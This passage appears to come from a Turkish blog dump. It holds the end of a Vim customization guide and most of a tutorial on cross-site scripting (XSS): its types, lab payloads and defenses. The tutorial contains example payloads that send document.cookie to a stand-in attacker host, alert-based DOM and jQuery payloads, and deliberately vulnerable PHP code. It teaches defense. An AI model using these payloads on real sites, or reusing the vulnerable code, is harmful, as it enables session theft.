önce yukarıda belirttiğim kısımlar arasına Plugin 'Lokaltog/powerline', {'rtp': 'powerline/bindings/vim/'} yazıp dosyanın en altına da aşağıdaki kodları yapıştın. Tamamdır. set rtp += /usr/ local /lib/ python2. 7 /dist-packages/ powerline /bindings/ vim / set laststatus = 2 set t_Co = 256 Bir başka güzel plugin ise ctrlp , control modunda ctrl+p yapar isek dışardan dosya açabilmemizi, text insert modunda isek autocomplete yapmamızı sağlar. Kurmak için; Plugin 'kien/ctrlp.vim' ve sonra :PluginInstall yazınız. Benim kullandığım .vimrc dosyası aşağıdadır. set nocompatible \" required filetype off \" required \" set the runtime path to include Vundle and initialize set rtp +=~ /.vim/ bundle/Vundle. vim call vundle#begin () \" alternatively, pass a path where Vundle should install plugins \"call vundle#begin('~/some/path/here') \" let Vundle manage Vundle, required Plugin 'gmarik/Vundle.vim' Plugin 'tpope/vim-fugitive' Plugin 'jnurmine/Zenburn' Plugin 'scrooloose/nerdtree' Plugin 'jistr/vim-nerdtree-tabs' Plugin 'kien/ctrlp.vim' Plugin 'vim-scripts/indentpython.vim' call vundle# end () \" required filetype plugin indent on \" required set clipboard = unnamedplus set rtp += /usr/ local /lib/ python2. 7 /dist-packages/ powerline /bindings/ vim / set laststatus = 2 set t_Co = 256 set number syntax enable Bu arada bütün pluginlere ait bilgileri vimawesome adresinden edinebilirsiniz. Sanırım başlangıç için yeterli oldu. Siz artık kendi ihtiyaçlarınıza göre daha da kişileştirebilirsiniz. Şimdi ise Vim'i efektif kullanmak için birkaç ipucu verelim: Normal Mode: :sp dosya_adi Dosyayı ekranı yatay olarak ikiye bölerek açar. :vsp dosya_adi Dosyayı ekranı dikey olarak ikiye bölerek açar. ctrl+w+J Eğer yatay olarak açılmış pencerede denerseniz pencere dikey olarak açılır ama eğer zaten dikey olan bir pencere denerseniz solundaki pencere ile yer değiştirir. ctrl+w+T Pencereyi sekmeye taşır. :tabs Açık sekmeleri listele. :tabm 0 Mevcut sekmeyi ilk sıraya taşı. :tabm Mevcut sekmeyi en sona taşı. :tabm {i} Mevcut sekmeyi i. sıraya taşı. (i=sekme numarası) :tabn Sonraki sekmeye geç. :tabp Önceki sekmeye geç. ctrl+shift+up Sonraki sekmeye geç. ctrl+shift+down Önceki sekmeye geç. ctrl+w+yön tuşları Pencereler arası geçiş yapmak için. ctrl+u 10 satır yukarı git. ctrl+d ve ctrl+f 10 satır aşağı in. Ayrıca penceler arası geçisi pratik hale getirmek için .vimrc dosyasına aşağıdaki 4 satırlık kodu yapıştırırak alt+yön tuşları kombinasyonlarını kullanarak daha hızlı bir şekilde geçiş yapabilirsiniz. nmap < silent > < A - Up > : wincmd k < CR > nmap < silent > < A - Down > : wincmd j < CR > nmap < silent > < A - Left > : wincmd h < CR > nmap < silent > < A - Right > : wincmd l < CR > Şimdi şöyle bir ufak sorunla karşılaştığınızı varsayıyorum. 2 veya daha fazla pencere açık ancak siz pencerelerin yerini değiştirmek istiyorsunuz. Şöyle bir şey yani: Örneğin pencere üç ile pencere bir in yerlerini karşılıklı olarak değiştirmek istiyorsunuz? İşte bir elemanda vim'e ilk başladığı zamanlarda böyle bir sorunla karşılaşmış (benim gibi) ve stack overflow 'da derdini dile getirmiş. Ancak bir yıl sonra dönüt alabilmiş ve daha sonra Plugin 'wesQ3/vim-windowswap' adında ufak bir plugin yazarak vim'de newbie olanlara yardımcı olmuş. Sağolsun. Yukarıda adı geçen plugini kurduğunuzu farzediyorum. Pencerelerin karşılıklı olarak yerlerini değiştirmek için leader key kullanacağız. Leader key nedir diye sorarsanız aslında kendi atatığınız bir karakterden ibaret olan bir tuş. Yani .vimrc dosyasında şöyle bir tanımlama yaparsanız; let mapleader=\"-\" sizin leader keyiniz - karakteri oluyor. Eğer herhangi bir karakter set edilmemiş ise default olarak back slash \\ karakteridir. Artık değiştirelim şu pencere bir ile üç 'ün yerini. Pencere bir de iken normal moda girip \\ww karakterlerine sırasıyla basınız. Daha sonra pencere üçe geçiş yapınız. Pencere üç 'de normal girip tekrar \\ww karakterlerine sırasıyla basınız. Pencere bir ile üç ün yeri değişmiş oldu. Son olarak kendi kullandığım vimden bir görüntü. Sağlıcakla kalınız.","tags":"GNU-Linux","title":"Vim'i Özelleştirmek"},{"url":"http://musana.net/yazilar/2016/xss-detayli-dokuman.html","text":"Başlamadan Önce; Her geçen yıl bu etkinliğe artan başvuru ve ilgiyi göz önüne alarak böyle bir etkinliğin organize edilip yönetilmesinin çok zor bir iş olduğunu daha işin başında söylemek isterim. Öte taraftan eğitimin tamamıyla gönüllü temelli olması işin bir başka güzel tarafı ama aynı zamanda zor tarafı da. Eğitimde görevli olan herkesin kendi zamanlarından fedakarlık göstererek bu kampı sorunsuz bir şekilde gerçekleştirmek için büyük çaba sarf ettikleri aşikar. Bu sebeble başta web güvenliği eğitmenlerden Ömer ÇITAK , Mehmet Dursun İNCE ve Murat YILMAZLAR olmak üzere bu etkinlikte emeği geçen her kişiye ayrı ayrı can-ı gönülden teşekkürlerimi sunarım. Bu bağlamda bende kendimce işin bi' ucundan tutup biraz kendimden, biraz eğitimde anlatılanları elimden geldiğince aktaracağım. Bazı yerlerde fazla detaya gireceğim bazı yerlerde bir cümle ile yetineceğim ancak amaç; elimden geldiği kadar lyk'da öğretilenleri sizlere aktarmak olacaktır. Özgür yazılım, özgür doküman, özgür bilgi! Bu yazının kamptan bir kaç gün sonra yayınlanması gerekiyordu ancak benden kaynaklanan sorunlar yüzünden şimdi yayınlayabildim. Bu sebebten ötürü yazının yayınlanmasını bekleyenleri beklettiğim için özür dilerim :) Bu yazı 3 ana bölümden oluşmaktadır. İlk bölümde XSS hakkındaki teorik bilgiler anlatılmıştır. XSS nedir? XSS zafiyeti ile neler yapılabilir? XSS zafiyetine sebeb veren durum nedir? XSS zafiyetini nasıl tespit ederiz? XSS zafiyetinin türleri nelerdir? İkinci bölümde, birinci bölümde anlatılan tüm teorik bilgiler lab ortamında pratiğe dökülmüştür. Son bölümde ise günlük hayatta karşımıza çıkabilecek örnek bir senaryo, video ile desteklenerek anlatılmıştır. XSS (Cross Site Scripting, CSS) XSS (Siteler arası betik çalıştırma) zafiyeti, saldırganın html, css, javascript ile hazırlamış olduğu zararlı kod parçalarının hedef kullanıcının(kurbanın) browserında izinsiz olarak çalıştırmasına imkan tanıyan bir web uygulama güvenliği zafiyetidir. Başka bir deyişle; bir uygulamada bulunan XSS zafiyeti saldırgana, hedef kullanıcının tarayıcısında zararlı kod çalıştırma imkanı tanır. Bu imkan neticesinde saldırgan, hedef kullanıcının oturum bilgilerini, ekran görüntüsünü, tuş girişleri gibi bilgileri alabilir, uygulama içeriğinin manüpüle edebilir. Bu zafiyet istismar edilirken bazen kurbanın insiyatifine bağlı olurken(Reflected ve DOM based türlerinde) bazen de saldırgan, kurban ile muhattap olmadan da zafiyetten etkilenmesini sağlayabilir(persistent türünde). XSS ile neler yapılabilir ? a) Html ile; Html kodlar kullanılarak fake inputlar yerleştirilip veri çalınabilir. Iframe etiketi kullanılarak başka sayfalar çağrılıp veri alınabilir. Html meta refresh ile sayfa yönlendirelebilir. Özetle içeriği html ve css kullanarak istediğiniz gibi manipüle edebilirsiniz. Asıl saldırı vektörleri javascript kodu kullanarak gerçekleştirilmektedir. Çünkü javascript ile daha dinamik işlemler yapabilmektedir. b) JavaScript ile; En bilinen ve yaygın olan document.cookie ile kullanıcıların oturum bilgilerini almak.(Session Hijacking) Ajax ile kullanıcı bilgilerinin alınıp uzak sunucudaki bir dosyada kayıt edilmesi. addEventListener fonksiyonu ile hedef kullanıcının bütün klavye, mouse, form etkileşimleri vs kayıt altına alınarak saldırganın kontrolunda olan bir uzak sunucuya gönderilebilir. Bulunan sistemlere bağlı olarak (camera hizmeti olan sistemlerde) kişinin kamerasından anlık ekran görüntüsü alınabilir. XMLHttpRequest nesnesi ile istenilen bir adrese istek yapılabilir. DOM sayesinde JS ile sayfa içeriği rahatlıkla değiştirilebilir. Örneğin bir form tagının action niteliğinin değeri değiştirilip kullanıcının form inputlarına girdiği (username,password, kredi kartı vs) hasas bilgileri alınabilir.(Phishing) Botnet ağı kurulabilir. Kısaca javascript kodu ile yapabileceğiniz her türlü işlemleri yapabilirsiniz. Bu artık üretkenliğinize kalan bir durumdur. Beef framework tarayıcı odaklı bir penetrasyon test aracıdır. Bünyesindeki bir çok exploit ile tarayıcıya yönelik ciddi saldırılar gerçekleştirebilir. XSS saldırısı da client side bir saldırı olduğu için bu zafiyet istismar edilirken bazen bu tool kullanılır. Çünkü saldırgana işi daha fonksiyonel, otomatize ve rahat bir şekilde kontrol edebilme avantajı sağlamaktadır. Zafiyet neyden kaynaklanmakta? XSS saldırıların en temel nedeni kullanıcılardan alınan inputların hiçbir filtrelemeden geçmeden işleme tabi tutulmasıdır. Bu inputlar; kullanıcıdan form elemanları aracılığıyla alınan bir değer olabilir(search, login, register etc.), get metoduyla gönderilen bir değer olabilir, http headerlerı ile gönderilen bir değer olabilir, cookie, session id değerleri olabilir, bir file upload kısmında dosyanın kendisi veya dosyanın adı olabilir. ... Özetle; kullanıcıdan sunucuya giden herhangi bir verinin bir filtreleme işlemine tabi tutulmadan doğrudan kullanılmasından kaynaklanır. Karşıdaki her zaman sıradan bir son kullanıcı olmayabilir. Bu hiçbir zaman göz ardı edilmemelidir. Geliştirilen her uygulama için kullanıcıları saldırgan olarak düşünüp uygulamayı o yönde geliştirmek gerekir. Basit bir kod; <?php echo $_GET [ 'cmd' ]; ?> En kısa anlatımla yukarıdaki kod id parametresinin aldığı değeri ekrana basıyor. Ne güzel :) Peki son kullanıcı sıradan değer değilde; html, javascript gibi istemci tarafından çalışan dillerin keywordlerini(veya server side kısmında çalışan diller için özel anlamı olan karakterleri) kullanınca ne olacak? Hiçbir filtreleme işlemi yapılmadığı için tabi ki de paşa paşa çalışacaktır. Çünkü ilgili değerler kaynak kodun syntaxını bozmadığı için düzgün bir şekilde çalışacaktır. Yani kullanıcı cmd parametresine <b>merhaba</b> değerini yazdığında ekranda bold olarak merhaba yazacaktır. Bu bizim için şunu ifade eder. Html ve JS kullanarak istediğimiz gibi at koşturabiliriz. Ayrıca yukarıdaki kod sadece xss zafiyetine yol açmamaktadır. Eğer cmd parametresindeki değer veritabanına kayıt edilip tekrar yazdırılırsa bu sql injection zafiyetine de sebeb verecektir. İşte kullanıcıdan alınan en ufak bir verinin kontrolu bu kadar önemli! XSS Türleri XSS saldırısında amaç; hedef kullanıcının tarayıcısında bir şekilde zararlı kod çalışmaktır. Bu amaca ulaşmak için bir kaç farklı yöntem bulunmaktadır. Bu farklılıktan dolayı xss saldırıları şimdilik 3 türe ayrılmıştır. Bizde bu sınıflandırmaya sadık kalarak konuyu anlatacağız. Reflected XSS Reflected XSS saldırısında; kurbanın, hedef siteye istek yapması için kullanacağı bağlantıda(link) zararlı kod parçası bulundurmasıdır. İstek yapılırken bu zararlı kod ifa edilir ve dönen cevap saldırganın saldırganın kontrolunde olan bir uzak sunucuya gönderilir. Burada önemli olan nokta; zafiyetin istismar edilmesi tamamen kullanıcının insiyatifine kalan bir durumdur. Yani kullanıcı zararlı kod içeren bağlantıya tıklamadığı sürece zafiyetten etkilenmeyecektir. Ayrıca diğer türlerine oranla en çok karşılaşılan xss saldırı türüdür. GET metoduyla alınan bir q parametresinde reflected xss zafiyeti olan bir sistem tassavur edelim. Yani şöyle; http://zafiyetlisite.com?q= Saldırgan böyle bir senaryo karşısında aşağıdakine benzer bir payload kullanacaktır. < script > document . getElementById ( \"sazan\" ). src = \"http://saldirgan.com?snif.php?q=\" + document . cookie ; < /script> Kodun meali; Yukarıdaki zararlı kod; sayfada id seçicisinin adı sazan olan bir elementi seçiyor(bu elementin <img /> olduğunu kabul edelim). Ve src niteliğine, saldırganın kontrolunda olan bir hostun adresini atıyor. Bu hostta bulunan sniff.php dosyasına, q paremetresinde kurbanın cookie değeri olacak şekilde get metoduyla bir istekte bulunuyor. Saldırgan da gelen bu isteği kayıt altına alıyor ve böylece hedef kullanıcının oturum bilgisini kendi oturum bilgisi ile değiştirerek giriş yapıyor.(Örnek senaryoda bunun nasıl yapıldığını göreceğiz.) Yani sonuç olarak saldırgan aşağıda bulunan bağlantıyı bir şekilde kurbana tıklatmak zorundadır. Daha doğru bir şekilde ifade edersek; saldırganın, kurbana aşağıdaki bağlantıya istek yapmasını sağlaması gerekir. İlla tıklaması gerekmez. Kendi kontrolunda olan başka bir site üzerinde bulunan src niteliğine sahip bir elemente aşağıdaki bağlantıyı gömmesi yeterlidir. Kurbanın ruhu bile duymaz. Daha derin düşününce aklıma daha kötü şeyler gelmiyor değil. Neyse :) http://zafiyetlisite.com?q= <script> document.getElementById(\"sazan\").src = \"http://saldirgan.com?snif.php?q=\"+document.cookie </script> Ancak... we have a bit of problem. Kim böyle bir bağlantıya tıklar? Sazan olmayan biri olursa böyle bir bağlantıdan işkilenip tıklamayacaktır. Bu tür durumlarda saldırgan link kısaltma servislerini kullanmaktadır. O yüzden her gördüğünüze tıklamayın :) Bazı eklentiler sayesinde kısaltılan linklere tıklamadan da açık halini de görmek mümkündür. Aklınızda olsun. Öte taraftan saldırganın kullanacağı payloadlar sadece bununla sınırlı değil. Örneğin aşağıdaki gibi bir payload ile de saldırgan amacına rahatlıkla ulaşabilir. http://zafiyetlisite.com?q= <script> document.location.href(\"http://saldirgan.com?snif.php?q=\"+document.cookie) </script> Saldırgan, kurbana yukarıdaki bağlantıya istek yapmayı başardığında document.location.href fonksiyonundan dolayı kullanıcı saldırganın belirtiği adrese yönlendirilecektir bu da saldırganın istemediği bir durumdur. Saldırılar daha çok kurbana sezdirmeden yapılmaktır. Bu nedenle ilk payloadımız veya ona benzer payloadlar daha çok tercih edilmektedir. Dediğim gibi payloadlar bunlardan ibaret değil saldırganın amacına ulaşması için birçok farklı payload çeşidi vardır. Ancak hepsinin tek bir amacı vardır; Önemli olan kurbana ilgili requesti yapmayı başarmaktır. Ne şekilde olacağının bir önemi yok, ama kurbana sezdirmeden yapılması tabi ki daha makbuldur. Son olarak bu anlatıklarımızı örnek bir diyagram üzerinde görürsek konunun tam anlaşılmasına faydası olacaktır. Saldırgan site üzerinde bulduğu reflected xss zafiyetini kullanarak başka kullanıcıların oturum bilgisini çalmak için zararlı linki kurbana gönderir. Kurban bağlantıya tıklar ve ilgili siteye gider. Ama aynı zamanda bağlantıda bulunan zararlı kod da ifa edilir ve web sitesinden kurbanın cookie bilgileri istenir ve dönen cevap kurbana iletilir. Gelen cevapta kurbanın cookie bilgileri bulunur ve zararlı olan js kodu cookie bilgilerini saldırganın serverına gönderecek olan kodu işler. DOM Based XSS type-0 xss olarak da bilinen bu xss türü, client side olup diğer iki türün(persistent ve reflected) aksine çok farklı bir mekanizmaya sahiptir. DOM tabanlı xss zafiyetine geçmeden önce basitçe DOM yapısının ne olduğundan bahsetmemizde fayda var. DOM (Document Object Model), w3c organizasyonu tarafından tanımlanan bir standartır. Temel amacı bir belge içerisindeki yapıyı object-oriented paradigmasına dönüştürmektir. Sadece html yapısına özgü olmamakla beraber herhangi bir belge de dom yapısına sahip olabilir. En çok duyduklanlar arasında XML ve HTML dom yapısı gelmektedir. Biz ise burada HTML DOM yapısını ele alacağız. HTML DOM, platformdan bağımsız olarak diğer dillerin html ile etkileşime geçerek bilgi alışverişinde bulunabilmesine imkan tanıyan bir arabirimdir. Bu yapıya göre bir html belgesindeki bütün etiketler (hiyerarşik bir düzene göre) nesne olarak kabul edilip bu nesnelere erişilerek içeriği veya özellikleri değiştirilebilmektedir. Başta söylediğimiz üzere yapısı gereği diğer iki türden farklıdır. Çünkü persistent ve reflected xss zafiyetleri sunucu taraflı filtrelemeler ile engellenebilirken DOM tabanlı xss de böyle bir durum söz konusu değildir. Bunun nedeni ise; bazı sorguların sonucuya iletilmeden kullanıcının browserında çalışması veya sunucudan cevap döndükten sonra sorgunun ifa edilmesiden kaynaklanmaktadır. Örneğin, url'de bulunan # (diez, hash,fragment) karakterinden sonraki ifade sunucuya iletilmez. Yani # den sonraki ifadeler için herhangi bir http trafiği oluşmaz. # ifadesi sayfa içerisinde bir bölüme geçiş yapmanın yanında farklı amaçlar içinde kullanılmaktadır. Size verebileceğim en iyi örnek şu an bu sayfanın sol üst tarafında bulunan içerikler kısmı olacaktır :) İlgili bağlantıya tıkladığınızda sayfa içerisinde ilgili bölüme gelmektesiniz ve url yapısında da # ifadesinden sonra geldiğiniz kısmın id değeri yazmaktadır. Peki # karakterinden sonraki kısmın sunucuya iletilmemesi iyi bir olay mı? Bir saldırganın gözünden bakarsak kesinlikle çok iyi bir olay. Url'deki ifadenin bir kısmının sunucuya iletilmeden tarayıcı tarafından icra edilmesi tam olarak şu anlama gelmektedir: Sunucu tarafındaki alınan hiçbir güvenlik işe yaramayacaktır. Çünkü zararlı kod # ifadesinden sonra yazıldığı için sunucuya iletilmiyor ancak sunucudan kullanıcıya cevap döndükten sonra # ifadesinden sonraki kod tarayıcı tarafından ifa edilecek ve zafiyet bu şekilde istismar edilmiş olacak. var x = document . location . hash . split ( '#' )[ 1 ]; document . write ( x ); Yukarıdaki JS kodu; Url içerisinde bulunan # karakter(ler)ini referans alarak url adresini parçalar ve oluşan değerleri bir dizi içerisinde tutar. Oluşan dizideki 2. elemanı(veya indisi 1 olan elemanı) x değişkenine atar ve bu değişkeni document.write ile ekrana basar. Eğer geliştirici web uygulamasının bir yerlerinde böyle bir kod kullanmış ise saldırganın bunu keşfetmesi durumunda geliştireceği payload gayet basittir. http://site.com#<script>alert(1)</script> Saldırgan yukarıdaki payloadı kullanarak kurbana istek yapmaya çalıştığında # karakterinden sonraki değer sunucuya iletilmeyeceğinden, sunucu tarafında alınmış çok ciddi filtreleme, sanitize, encoding, white list vs. işlemleri olsa bile bu durum dom-based xss zafiyetini engelleyemeyecektir. Çünkü sunucuya # karakterinden sonraki ifade gönderilmeyecektir. # karakterinden önceki istek sunucuya yapılır ve sunucudan cevap döndükten sonra # karakterinden sonraki kod kullanıcının browserı tarafından ifa edilir. Bu saldırı vektörü client side bir yapıya sahip olduğundan dolayı browser geliştiricileri bu durumu çözmek için tarayıcının kendi içinde güvenliği sağlamaya çalışmışlardır. Yukarıdaki js kodunu çalıştırıp payloadı denediğinizde alert alamayabilirsiniz. Çünkü Chrome, XSS Auditor diye adlandırdığı, kullanıcıyı xss saldırılarından korumak için bir güvenlik sağlamış, firefox ise encoding işlemine tabi tutacağından payload çalışmayacaktır. Chrome bir çok xss payloadını güvenlik nedeniyle engellemektedir. Bu yazının ikinci ana bölümünde anlatığım testleri denerken chrome kullanırsanız büyük ihtimalle örneklerin çoğunda alert alamayacaksınız.(Firefox kullanın.) Bu nedenle xss zafiyeti ararken chromeda (veya başka bir tarayıcıda olabilir) hata almamanız xss zafiyetinin olmadığı anlamına gelmemektedir. Çünkü her tarayıcı bazı standartlara uymayıp kendi standartlarını oluşturmaya/dayatmaya çalıştıklarından dolayı aynı kodlar farklı tarayıcılarda farklı sonuçlar verebilmektedir. Tarayıcıdan tarayıcıya farklı sonuçlar almanız sizi şaşırtmasın yani. Özellikle front-end geliştiricileri bu durumu çok iyi bilmektedir. Buna binaen xss zafiyeti ararken aynı payloadı farklı tarayıcılarda denemekte fayda var. Öte taraftan dom based xss client side bir saldırı olduğundan diğer tarayıcılar gibi firefoxda kullanıcılarının bu zafiyetten etkillenmeleri için encoding işlemi yapmaktadır. Mesela firefox # karakterinden sonraki ifadeyi encoding işleminden geçirdiği için yukarıdaki payloadımız firefoxda da çalışmayacaktadır. Firefox, diğer xss türlerinde chrome gibi herhangi bir engelleme yapmamaktadır. Chrome veya firefox'un eski sürümlerinde bu temel payloadlar çalışmaktadır. Kim güncel olmayan bir tarayıcı kullanır ki diyebilirsiniz. Bunlar temel payloadlar olduğu için sezgisel olarak chrome engelleyebiliyor ancak chrome'un yakalayamadığı çok complex payloadlar bulunmaktadır. Ayrıca chrome da bulunan XSS Auditor bypass edilebilmektir. Bu yazının yayınlanması yeterince geciktiğinden XSS Auditor'un nasıl çalıştığını ve nasıl bypass edileceğini başka bir yazıda ele alacağım İnşallah. Yukarıdaki resim bize bazı noktalarda önemli bilgiler vermketedir. Öncellikle sayfanın kaynak koduna baktığınızda payloadımızın görünmediğini göreceksiniz. DOM based xss zafiyetinde payload sayfanın kaynak kodunda görünmez. Ancak geliştirici araçlarından bakarsanız görebilirsiniz. Yukarıda görmüş olduğunuz üzere geliştirici araçlarından baktığımızda kırmızı olarak görülen bölümde, xss.html dosyasının 12. satırında yer alan kodun tehlike arz etmesinden dolayı XSS Auditor un scriptte yer alan ilgili kodu çalıştırmadığını söylüyor. Google xss zafiyetinin sebeb olacağı tehlikeleri göz ardı etmediğinden kullanıcılarını bu tehtitten korumak için böyle bir güvenlik önlemi almış. Bizi bizden daha çok düşünüyorlar. Eksik olmasınlar(!) Kullanırken dikkat edilmediği taktirde dom-based xss zafiyetine sebeb veren js fonksiyonu yukarıda verdiğimiz document.location.hash.split den ibaret değildir. Aşağıdaki js kodu da pek ala dom-based xss zafiyetine sebeb olmaktadır. var name = location . hash . slice ( 1 ); document . write ( \"Hello \" + name ); Bu zafiyetin birde jquery boyutu var tabi. JQueryde seçiciler(Selectors); bir html dökümanındaki etiketleri, id leri, class ları seçmek için kullanılan bir yapıdır. Bunun bizi ilgilendiren tarafı ise; seçiciler ile seçtiğiniz bir id, class veya html etiketine bazı metotlar kullanarak dinamik bir şekilde ekleme yapabilmemizdir. Aşağıdaki listede kullanırken çok dikkat etmemiz gereken jquery metodları payloadlarıyla beraber verilmiştir.( sazan adlı bir id değerimizin olduğu varsayılmıştır.) $ ( '<script>alert(1);</script>' ). appendTo ( '#sazan' ); $ ( '<script>alert(1);</script>' ). prependTo ( '#sazan' ); $ ( '#sazan' ). after ( '<script>alert(1);</script>' ); $ ( '#sazan' ). before ( '<script>alert(1);</script>' ); $ ( '#sazan' ). prepend ( '<script>alert(1);</script>' ); $ ( '#sazan' ). html ( '<script>alert(1);</script>' ); $ ( '#sazan' ). append ( '<script>alert(1);</script>' ); Defalarca dedik yine diyelim; Kullanıcının müdahale edebileceği yerlere veya kullanıcıdan değer aldığınız yerlere çok ama çok dikkat ediniz! Bu yapının da net anlaşılması adına diyagram üzerinde gösterelim.(Diyagramlar genelde konu başında verilir ama neden ben konu sonunda veriyorum bilmiyorum.) Saldırgan hedef sistemdeki dom-based xss zafiyetini kullanarak oturum bilgisini çalmak istediği kullanıcıya payloadı ile beraber linki gönderir. Kullanıcı(victim) bağlantıya tıklayıp zafiyetli siteye girer. Zafiyetli site kullanıcıya normal bir cevap döner ancak site; kendisini ziyaret eden kullanıcıların yaptığı sorguyu js ile ekrana yazmaktadır. (Payload henüz execute edilmemiştir.) Zafiyetli siteden cevap döndükten sonra saldırganın sorgu parametresine yazdığı payload kurbanın tarayıcısı tarafından ifa edilir. Kurbanın oturum bilgileri saldırganın sunucusuna gönderilir. Stored(Persistent) XSS Kullanıcıdan alınan verinin yeterli filtrelemeden geçmemesi sonucunda veri tabanına kayıt edildikten sonra kayıt edilen bu veri başka bir yerde kullanılmak üzere veri tabanından çekileceği sırada ortaya çıkan bir xss zafiyet türüdür. Diğer türlerine oranla çok daha tehlikelidir. Çünkü bu xss zafiyet türünde zararlı kod veri tabanına kayıt edilir. Bu da şu anlama gelmektedir; Sisteme kayıtlı olan kullanıcılar zafiyetten etkilenen sayfayı ziyaret ettikleri anda oturum bilgilerini farkında olmadan saldırgana kaptırırlar. Tehlikeli olan nokta tam da burası işte. Saldırganın kimseyle muhattap olmaması... Diğer xss türlerinde saldırgan, kullanıcılara ilgili bağlantıya bir şekilde istek yaptırtmaya çalışır ama burada böyle bir durum söz konusu değildir. Payloadın kendisi sitenin veri tabanında kayıtlı zaten. Sadece payloadın select edileceği sayfayı kullanıcın ziyaret etmesi yeterli. Bu durumda sadece bir kişi veya bir grup değil sistemde kayıtlı olan herkes zafiyetten etkilenmiş olur. Diğer xss türlerinde fazla detaya girdiğimiz için bu türün teknik olarak diğerlerinden çok bir farkı bulunmamakta. Sadece bu sefer işin içinde veri tabanı girmektedir. Bu da saldırının kapsamını ve tehlikesini ciddi anlamda büyütmektedir. Kullanıcıların yorum yaptığı bir sistem düşünelim. Ve back-end kısmında şöyle bir kod yazılmış olsun. <?php #yorumlar.php sayfası. Kullanıcıların yorum yazması veya yazılan yorumları okuması için kodlandı. #veri tabanı bağlantısı ve seçimi vs. yapıldı... $mesaj = $_POST [ 'mesaj' ]; $user = $_POST [ 'user' ]; $ekle = mysql_query ( INSERT INTO yorumlar ( user , mesaj ) VALUES ( '$user' , '$mesaj' )); $q = mysql_query ( SELECT * FROM yorumlar ); while ( $row = mysql_fetch_array ( $q )) { echo $row [ 'user' ] . \" - \" . $row [ 'mesaj' ]; } ?> Eminim yukarıdaki kodu yazacak junior developerlar bile yoktur artık. Ancak amacım basit bir örnek ile mantığını anlatmak olduğundan böyle bir kod yazdım. Yukarıdaki kodda mysql database ile işlem yaptık ama diğer databaselerde de yukarıdakine benzer fonksiyonlar ile işlem yaptırırsanız durum değişmeyecektir yine. İsterseniz php'deki oracle database ile işlem yapmak için kullanılan oci_* fonksiyonlarını kullanın bir şey değişmeyecektir. Bu gibi düz database işlemleri yaparsanız çok büyük ihtimmale zafiyet bırakırsınız ki php'de zaten artık bu fonksiyonları tavsiye etmiyor ve kullanıcılarının ya mysqli yada pdo kullanmaya zorluyor. Neyse konu fazla dağılmasın. Sonuç olarak kullanıcıdan gelen veriyi temizlemeden doğrudan sql sorgusuna sokulması hem sqli hemde xss zafiyetine sebeb olmaktadır. Yukarıda olan durumda tam olarak bu. Php için PDO sınıfını kullanırsanız filtrelemeler ile uğraşmanıza gerek kalmaz. PDO sınıfı, php ile veritabanı arasında güvenli bir şekilde veri alışverişi yapmak ve diğer veri tabanları desteği sayesinde oldukça kolaylık sağlamaktadır veya orm kullanabilirsiniz. Örnek senaryo bölümünde bu zafiyet türü kullanıldığı için gerekli detayı videoda izleyebilirsiniz. XSS Zafiyetinin Çözümü Şimdiye kadar hep bir saldırganın gözüyle sisteme baktık ama bu başlıkta bir devoloper olarak duruma yaklaşacağız ve geliştireceğimiz uygulamalarda xss zafiyeti bırakmamak için bazı ipuçları vereceğiz. Girdi Kontrolleri Zafiyete, kullanıcının müdahale edebildiği alanlar veya kullanıcıdan alınan veriler sebeb olduğu için çözümü de burada arayacağız. Girdi denetiminleri çok sıkı sıkıya yapıldığı taktirde bu zafiyet ortaya çıkmayacaktır. Şimdi bu denetimlerde kullanılan kabul görmüş çözüm tekniklerine göz atalım. White List Tekniği Pozitif girdi denetimi olarakta bilinen bu çözüm metodunda kullanıcıdan gelecek olan verilerin(karakterlerin, kelimelerin vs) hangilerine izin verileceği belirtilir. Örnek vermek gerekirse kullanıcıdan sadece alfanumeric değerler alıyor isek (yani A'dan Z'ye ve 0'dan 9'a) bunu regex ile ifade ederek sadece kabul edeceğimiz verileri belirleriz. Bu durumda kullanıcıdan gelecek olan özel karakterlerin bütününü kabul etmemiş oluruz. Başka bir örnek daha verecek olursak kullanıcıdan aldığımız değerler sadece belli kelimeler veya ifadelerden ibaret ise sadece kabul edebileceklerimizi belirler, belirlediğimiz değerler dışında gelen değerleri işleme almayız. Black List Tekniği Bu teknikte ise white list'in aksine kullanıcıdan gelen veriler arasında kabul etmediklerimizi belirleriz. White list gibi sağlam görünse de aslında hiç öyle değildir. Bu çözüm tekniğinde olasılıklar çok fazla ve bir tanesinin bile gözünüzden kaçması zafiyete sebeb olmaktadır. < , ' , > , \" karakterlerini engellediğinizde bunların hex formatını da engelleyeceksiniz encode edilmiş hallini de engelleyeceksiniz yazılan koda göre değişiklik göstermekle beraber bazen bu karakterler kullanılmadan da zafiyet oluşabilmektedir. Bu durumda script kelimesini engellemelisiniz, alert, prompt, confirm, hex formatları, char formatları vs vs külfetten başka bir şey değil gördüğünüz gibi olasılıklar çok fazla çünkü. Sanitize Sanitize yönteminde kullanıcıdan gelen veri arıtılır/temizlenir. Kullanıcıdan gelen veriler arasında yasaklı karakterler(black list)/izin verilmeyen karakterler(white list) bulunmasına rağmen bunu işleme almamak yerine veri içerisindeki zararlı/istenmeyen karakterler veriden çıkarılarak verinin temizlendikten sonra işleme alınması yöntemidir. Bu çözüm yoluda geliştirdiğiniz uygulamadada xss zafiyeti bırakma olasılığınızı çok çok düşürmektedir. Encoding Gelen veri içerisindeki özel karakterlerin başka bir formata dönüştürülüp artık özel anlamını yitirmesi durumudur. Yukarıda dom-based xss türünde firefox tarayıcısının kullanıcılarını bu zafiyetten korumak için tam olarak yaptığı encoding işlemidir. Html ve url encoding web saldırılarından korunmak için en sık başvurulan kodlamalardandır. <, >, ', \" gibi karakterleri encode işleminden geçirdiğinizde bazı web tabanlı saldırılarından(sqli, xss, code inj.) korunmak için kayda değer bir önlem almış olursunuz, ama tabiki tek başına bu çözüm yeterli değildir. Geliştireceğiniz uygulamada yukarıda sunulan çözüm stratejilerinden birkaçını beraber kullanırsanız bu zafiyete mahal vermemiş olursunuz. Girdiyi birkaç aşamadan geçirdiğinizde güvenliği artırmış olursunuz. Yani önce white ve black list yöntemi ile girdiyi temizle sonra encoding uygula en sonunda veriyi işleme al. Güvenlik camiasındaki şu meşhur sözü duymuşsunuzdur; En zayıf halkanız kadar güvendesinizdir. Güvenlik bir bütün olarak ele alınmalıdır. Sisteminizi parçalara ayırıp her parçanın güvenliğini ayrı ayrı sağladığınız takdir de parçaların oluşturduğu bütün güvenli sayılır. Aksi halde tek bir parçadan kaynaklanan zafiyet bütün sistemi riske atmaktadır. Web for Pentester Bu teorik bilgilerimizi uygulamayabilmek için bir pentest lab ortamı kuracağız. Bunun için bu linkte bulunan iso dosyasını indirip wmware veya virtual box gibi 